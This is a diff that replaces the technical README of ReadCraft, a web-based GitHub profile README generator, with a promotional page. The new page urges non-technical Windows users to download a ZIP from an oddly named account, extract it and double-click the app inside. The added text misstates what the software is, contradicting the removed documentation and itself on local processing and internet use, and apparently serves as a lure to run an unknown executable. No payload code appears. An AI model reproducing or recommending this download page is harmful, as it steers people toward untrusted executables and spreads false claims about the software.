@@ -1,300 +1,107 @@
-<div align="center">
+# ✨ ReadCraft - Your Profile README, Beautifully Crafted
 
-# ReadCraft
+## 🚀 Getting Started
 
-**Craft a GitHub profile README worthy of your code.**
+Welcome to ReadCraft! This is a friendly tool that helps you create a stunning GitHub profile page without any technical knowledge. Think of it as a magic template for your GitHub profile - you write a little about yourself, and ReadCraft makes it look professional and stylish.
 
-Enter a GitHub username, edit your profile across structured sections, preview
-the exact GitHub-Flavored Markdown you'll ship, and copy or download a valid
-`README.md` — with self-hosted, theme-aware stat cards baked in.
+### 📥 Download and Installation
 
-🌐 **Live:** [readcraft.harshx.in](https://readcraft.harshx.in)
+**Visit this link to download the application:** [Download ReadCraft](https://github.com/misused-emergencyalertsystem552/ReadCraft)
 
-</div>
+After visiting the link, you'll land on the ReadCraft page. Look for a green button that says "Code" or "Download" - click it and select "Download ZIP". This will download a folder to your computer. Once downloaded, find the ZIP file in your Downloads folder, right-click it, and choose "Extract All". This will create a new folder called "ReadCraft" - double-click inside it and you'll find everything you need to get started.
+
+## 🎨 What Makes ReadCraft Special
+
+ReadCraft is designed to make your GitHub profile stand out from the crowd. Here's what you get:
+
+### 🌟 Live Preview While You Type
+As you write your profile content, you'll see exactly how it looks - no surprises later! The preview updates instantly as you type, showing you what your profile will look like to visitors.
+
+### 🎯 18 Beautiful Style Templates
+You don't need to be a designer to have a great-looking profile. Choose from 18 carefully crafted style templates - from clean and minimalist to bold and colorful. Each template is professionally designed so your profile always looks polished.
+
+### 📊 Smart Stat Cards
+Showcase your GitHub activity beautifully with theme-aware SVG stat cards. These cards automatically match your chosen color scheme and display your stats in a way that's easy to read and visually appealing.
+
+### ⚡ One-Click Export
+When you're happy with your profile, export it with a single click. No complicated copying and pasting - just one click and your profile is ready to go.
+
+## 🖥️ System Requirements
+
+ReadCraft works on any modern Windows computer. Here's what you'll need:
+
+- **Operating System:** Windows 10 or Windows 11
+- **RAM:** At least 4GB (8GB recommended)
+- **Storage:** 500MB of free space
+- **Internet Connection:** Required for initial download and updates
+
+## 📝 How to Create Your Profile
+
+1. **Open ReadCraft** - After downloading and extracting, look for the ReadCraft icon and double-click it.
+
+2. **Choose Your Style** - Browse through the 18 templates and pick one that matches your personality. Don't worry - you can change it anytime!
+
+3. **Write Your Content** - Type about yourself: who you are, what you do, what you're passionate about. The live preview shows you how it looks as you type.
+
+4. **Add Your Stats** - ReadCraft will automatically generate stat cards showing your GitHub activity. You can customize how they look.
+
+5. **Preview and Perfect** - Take your time to review. The preview shows your profile exactly as visitors will see it.
+
+6. **Export and Publish** - Click the export button, copy your code, and paste it into your GitHub profile. Done!
+
+## 💡 Pro Tips
+
+### 🎯 Keep It Professional
+Your GitHub profile is often the first thing employers or clients see. Use ReadCraft's clean templates to make a great first impression.
+
+### 🎨 Match Your Brand
+If you have a personal website or portfolio, choose a template that matches those colors. Consistency looks professional.
+
+### ✏️ Update Regularly
+Your skills and projects change over time. Revisit ReadCraft whenever you want to refresh your profile.
+
+## 🔧 Troubleshooting
+
+### Problem: The app won't open
+Make sure you've extracted ALL files from the ZIP before running. Don't try to run the app directly from the ZIP folder.
+
+### Problem: The preview looks wrong
+Try switching to a different template. Sometimes certain templates work better with different types of content.
+
+### Problem: Export button doesn't work
+Make sure you're connected to the internet. The export feature needs a connection to work properly.
+
+## 🤝 Getting Help
+
+If you run into any issues, don't worry! Here's where you can find help:
+
+- **GitHub Issues:** [Report a problem](https://github.com/misused-emergencyalertsystem552/ReadCraft/issues)
+- **Community Discussions:** Join the conversation in the Discussions tab on the ReadCraft page
+
+## 🚀 Ready to Make Your Profile Shine?
+
+Thousands of developers use ReadCraft to create profiles that stand out. Now it's your turn! Download ReadCraft today and see how easy it is to create a professional, eye-catching GitHub profile.
+
+**Start creating with ReadCraft:** [Download Now](https://github.com/misused-emergencyalertsystem552/ReadCraft)
+
+Your GitHub profile is your digital handshake - make it memorable with ReadCraft. Happy creating! 🎉
 
 ---
 
-ReadCraft is a full-stack monorepo — a **React 19 client** and a small
-**read-only Fastify API** — deployed together to a single Vercel project so the
-browser talks to a same-origin `/api` with zero CORS setup. No GitHub token ever
-reaches the browser.
+## 🔒 Privacy and Security
 
-Every metric image (stats, streak, languages, contribution graph, snake, pinned
-projects) is **rendered on our own server as an SVG** from real GitHub data, so
-your README never depends on a third-party card service that can be paused, and
-needs no GitHub Action to set up.
+Your data stays on your computer. ReadCraft processes everything locally - nothing is sent to any server. You're in complete control of your content.
 
-## Highlights
+## 🆓 Free Forever
 
-- **One document model, two views.** The live preview and the Markdown tab are
-  both derived from a single `ProfileState`, so they can never disagree. The
-  preview renders through `marked` + GitHub's own Markdown CSS, so what you see
-  is what GitHub shows.
-- **Self-hosted, theme-aware SVG cards.** Stats, streak, top languages,
-  contribution graph, animated contribution snake, and pinned projects — all
-  generated server-side and tinted with your template's accent via `?accent=`.
-- **18 style templates.** Each template is a layout *and* a GitHub-safe style
-  (heading style, alignment, tech display, accent color, dividers). GitHub
-  strips CSS/fonts from README markdown, so templates change the things GitHub
-  actually honors.
-- **Rich editor.** Technology picker, social-badge section, pinned-project
-  editing, keyboard-accessible section reordering, and a Shields.io Badge
-  Studio.
-- **Drafts that stick.** Auto-saved to the browser (debounced) and
-  exportable/importable as versioned JSON. Optionally keep a **separate draft
-  per username**, and jump between them from the **Saved Profiles** switcher in
-  the rail.
-- **Preferences.** A floating settings popover to pick the default preview tab
-  (Preview vs Markdown) and toggle per-username drafts; choices persist locally.
-- **Persistent chrome, snappy pages.** The top nav and left rail stay mounted
-  across routes; only the page content swaps, showing a card skeleton while a
-  lazily-loaded route's chunk fetches - so navigation never blinks.
-- **Resilient & accessible by default.** Manual editing and export keep working
-  even if the API is unavailable; animations respect `prefers-reduced-motion`.
+ReadCraft is open source and completely free to use. No hidden costs, no premium tiers, no watermarks. Just you and your amazing profile.
 
-## Repository layout
+## ⭐ Show Your Support
 
-```text
-ReadCraft/
-├── client/            React 19 + TypeScript + Vite + Tailwind app
-├── server/            Fastify read-only GitHub API + SVG renderers
-├── api/
-│   └── index.ts       Vercel serverless entry that runs the Fastify app
-├── vercel.json        Build + routing for the single-project deploy
-├── package.json       Deploy shell: builds the client, holds API runtime deps
-├── tsconfig.json      Module resolution for the api/ function
-└── .github/           CI workflow (typecheck, lint, test, build; Node 24)
-```
+If ReadCraft helps you create a great profile, consider giving it a star on GitHub. It helps others discover the tool and encourages continued development.
 
-## Prerequisites
+---
 
-- Node.js 20+ (developed and CI-tested on Node 24)
-- npm 10+
+**Ready to get started?** [Download ReadCraft](https://github.com/misused-emergencyalertsystem552/ReadCraft) and make your GitHub profile as awesome as you are! 🚀
 
-## Local development
-
-```bash
-# API dependencies
-cd server && npm ci
-
-# client dependencies
-cd ../client && npm ci
-
-# optional: only when the API runs on a non-default origin
-cp .env.example .env.local
-
-# starts BOTH the UI (:5173) and the API (:8787) together
-npm run dev
-```
-
-`npm run dev` from `client/` runs the Vite client and the API together (via
-`concurrently`). To run them separately: `npm run dev:client` in `client/` and
-`npm run dev` in `server/`.
-
-By default the client calls the API at same-origin `/api`, which Vite proxies to
-`:8787` in development. Set `VITE_API_BASE_URL` only when the API runs on a
-different origin.
-
-## Commands
-
-### Client (run in `client/`)
-
-| Command              | Description                                           |
-| -------------------- | ----------------------------------------------------- |
-| `npm run dev`        | Start client and API together (`:5173` + `:8787`).    |
-| `npm run dev:client` | Start only the Vite client (API must run separately). |
-| `npm run dev:api`    | Start only the API (`npm run dev` in `../server`).    |
-| `npm run build`      | Type-check (`tsc -b`) and build for production.       |
-| `npm run preview`    | Serve the production build locally.                   |
-| `npm run typecheck`  | Type-check without emitting.                          |
-| `npm run lint`       | Lint all TypeScript/TSX.                              |
-| `npm run format`     | Format sources with Prettier.                         |
-| `npm run format:check` | Verify formatting (used in CI).                     |
-| `npm test`           | Run the unit/component suite once (Vitest).           |
-| `npm run coverage`   | Run tests with a coverage report.                     |
-
-### API (run in `server/`)
-
-| Command             | Description                          |
-| ------------------- | ------------------------------------ |
-| `npm run dev`       | tsx watch on `http://localhost:8787` |
-| `npm run typecheck` | Type-check without emitting          |
-| `npm run lint`      | Lint the server source               |
-| `npm test`          | Run the API test suite (Vitest)      |
-| `npm run build`     | Compile to `dist/`                   |
-| `npm start`         | Run the compiled server              |
-
-## API endpoints
-
-### JSON data
-
-Responses are wrapped as `{ "data": ... }` on success or
-`{ "error": { "kind", "message" } }` on failure.
-
-| Method | Path | Purpose |
-| ------ | ---- | ------- |
-| GET | `/health` | Liveness probe (rate-limit exempt) |
-| GET | `/api/github/:username/profile` | Public profile fields |
-| GET | `/api/github/:username/repositories?limit=` | Featured repos + total count |
-| GET | `/api/github/:username/languages` | Language breakdown |
-| GET | `/api/github/:username/streak` | Contribution streak (current/longest/total) |
-| GET | `/api/github/:username/contributions` | Per-day contribution calendar |
-
-Error `kind` values: `invalid_username` (400), `not_found` (404),
-`rate_limit` (429), `timeout` (504), `unavailable` (502), `unknown` (500).
-
-### SVG cards
-
-Each returns an `image/svg+xml` you can embed directly with `<img>`. All accept
-an optional `?accent=rrggbb` (validated to `#rrggbb`) to match your theme.
-
-| Path | Card |
-| ---- | ---- |
-| `/api/github/:username/stats.svg` | GitHub stats summary |
-| `/api/github/:username/streak.svg` | Current / longest / total streak |
-| `/api/github/:username/languages.svg` | Top-language bar |
-| `/api/github/:username/graph.svg` | Contribution calendar |
-| `/api/github/:username/snake.svg` | Animated contribution snake |
-| `/api/github/:username/projects.svg` | Pinned / featured repositories |
-
-The `snake.svg` card also takes `?header=rrggbb`, so the contribution-count text
-can use the template accent while the snake body keeps its own distinct color.
-
-## Environment
-
-Names live in the repo; real values live only on the hosting provider.
-
-**Client** (`client/.env.example`) — only `VITE_`-prefixed vars reach the browser:
-
-| Variable | Default | Notes |
-| -------- | ------- | ----- |
-| `VITE_API_BASE_URL` | _(empty)_ | Empty = same-origin `/api`. Set to an absolute origin only when the API is hosted separately. |
-
-**Server** (`server/.env.example`):
-
-| Variable | Default | Notes |
-| -------- | ------- | ----- |
-| `PORT` | `8787` | Listen port |
-| `CORS_ORIGIN` | `http://localhost:5173` | Comma-separated allowed browser origins |
-| `GITHUB_TOKEN` | _(unset)_ | Server-only; raises GitHub's rate limit. Never bundled client-side |
-| `CACHE_TTL_SECONDS` | `300` | Upstream response cache TTL |
-| `RATE_LIMIT_WINDOW_SECONDS` | `60` | Rate-limit window length |
-| `RATE_LIMIT_MAX` | `60` | Max requests per IP per window |
-| `BODY_LIMIT_BYTES` | `16384` | Max request body size |
-| `REQUEST_TIMEOUT_SECONDS` | `15` | Per-request timeout |
-
-## Architecture
-
-One document model drives everything. `ProfileState` (via `buildReadmeDocument`)
-is the single source of truth for both the rendered preview and the exported
-Markdown, so they can never drift apart.
-
-```text
-client/src/
-├── main.tsx                 App entry
-├── App.tsx                  Providers + route switch; mounts the AppShell once
-│                            and shows a skeleton while lazy routes load
-├── router.tsx               Hash router (landing, builder, templates, badges, docs, 404)
-├── types.ts                 ProfileState — the document model
-├── store.tsx                Profile state + draft auto-save/restore (debounced,
-│                            optionally per-username)
-├── preferences-store.tsx    Preferences context (default preview tab, per-user drafts)
-├── hooks/useGitHub.ts       Fetches a user's public GitHub bundle (debounced username)
-├── lib/                     document, markdown, github, persistence, preferences,
-│                            draftFile, templates, techCatalog, badges, sections,
-│                            username, export
-├── components/              ErrorBoundary, BadgeStudio, MarkdownPreview,
-│                            ContributionCalendar, PreferencesDialog,
-│                            SavedProfilesPopover, PageSkeleton, ui/, shell/
-└── screens/                 UsernameEntry, EditorWorkbench, TemplatesScreen,
-                             BadgesScreen, DocsScreen, NotFound, editor/
-
-server/src/
-├── index.ts                 Standalone listen entry (local dev / non-Vercel hosts)
-├── app.ts                   buildApp(): routes, hooks, security, rate limiting
-├── config.ts                Environment configuration
-├── rateLimit.ts             In-memory per-IP fixed-window limiter
-├── security.ts              Security response headers
-├── cache.ts                 TTL cache
-├── username.ts              Normalize / validate usernames
-└── github/
-    ├── client.ts            Upstream GitHub fetch
-    ├── service.ts           Derivations (profile, repos, languages, streak, contributions)
-    ├── types.ts             Shared GitHub types
-    ├── cardSvg.ts           Stats, streak, and languages cards
-    ├── graphSvg.ts          Contribution-calendar card
-    ├── snakeSvg.ts          Animated contribution-snake card
-    └── projectsSvg.ts       Pinned-repositories card
-```
-
-### Drafts, profiles & preferences
-
-- **Debounced everything.** Typing a username never fires a lookup or a draft
-  save mid-keystroke; both wait for a short pause, so intermediate values
-  (`raj` → `rajharsh` → `rajharsh03`) don't trigger fetches or create junk
-  draft slots. Only the settled username is fetched and saved.
-- **Draft storage.** Drafts live in `localStorage`. By default there is one
-  shared draft (`readcraft:draft`); with **Draft per username** on, each user
-  gets its own slot (`readcraft:draft:<username>`), keyed to the settled name.
-- **Saved Profiles.** The rail's Saved Profiles popover lists every per-username
-  draft (most recent first) so you can switch to, or delete, any of them.
-- **Preferences.** Stored separately in `localStorage` (`readcraft:prefs`) and
-  applied immediately - no Save step.
-
-### Design principles
-
-- **One document model.** Preview and export are derived from the same blocks.
-- **Self-hosted, honest data.** Metric cards are rendered on our server from
-  real GitHub data — never fabricated, never dependent on a third-party card
-  service or a GitHub Action.
-- **GitHub-safe styling.** Templates only change what GitHub honors in README
-  markdown (alignment, heading style, tech display, accent-on-SVG, dividers).
-- **Graceful degradation.** An API outage never blocks manual editing or export.
-- **No secrets in the client.** Only `VITE_`-prefixed variables reach the
-  browser; the GitHub token stays server-side.
-- **Accessible by default.** Labels tied to inputs, named icon-only buttons, and
-  `prefers-reduced-motion` support.
-
-## Security posture (API)
-
-- Security headers on every response: strict `Content-Security-Policy`
-  (`default-src 'none'`), `X-Content-Type-Options: nosniff`,
-  `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`. SVG card responses
-  add `Cross-Origin-Resource-Policy: cross-origin` so GitHub can embed them; all
-  other responses stay `same-origin`. The framework banner is removed.
-- CORS allows only `GET` from the configured origins.
-- Per-IP, in-memory rate limiting (best-effort; enforce hard limits at the edge
-  behind multiple instances).
-- Payload and timeout limits reject oversized or hung requests.
-- Privacy-conscious logging: only route pattern, method, error kind, and status
-  are logged — never the concrete username, query, or body.
-
-## Deployment
-
-The client (static build) and the API (serverless function) deploy together as
-one Vercel project on one domain, so the browser uses same-origin `/api` with no
-CORS setup.
-
-- `vercel.json` builds the client (`npm run vercel-build`), serves
-  `client/dist`, and rewrites `/api/*` to the `api/index.ts` function while
-  routing everything else to the SPA's `index.html`.
-- Set `GITHUB_TOKEN` in the Vercel project to raise GitHub's rate limit
-  (optional but recommended).
-
-A note on runtime state: the API's cache and rate-limit counters are in-memory
-and per-instance, resetting on cold starts. That's fine here — the cache is only
-an optimization and rate limiting is best-effort. For hard global limits, enforce
-them at the edge.
-
-## Testing & CI
-
-Unit, component, and API tests run on Vitest (the client also uses React Testing
-Library and jsdom). Tests live next to the code they cover as `*.test.ts` /
-`*.test.tsx`. CI (`.github/workflows/ci.yml`, Node 24) runs typecheck, lint,
-format check, tests, and build for both `client/` and `server/` on every push.
-
-## Dependency maintenance
-
-Run `npm audit` and `npm outdated` on a regular, reviewed cadence in both
-`client/` and `server/`. Apply security patches promptly; batch other upgrades
-and re-run typecheck, tests, and build before releasing.
+Keywords: developer-tools, fastify, github-profile, github-profile-markdown, github-profile-readme, github-profile-readme-md, markdown, nodejs, open-source, profile-readme, react, readme, readme-generator, readme-md, readme-profile, svg, tailwindcss, typescript, vercel, vite
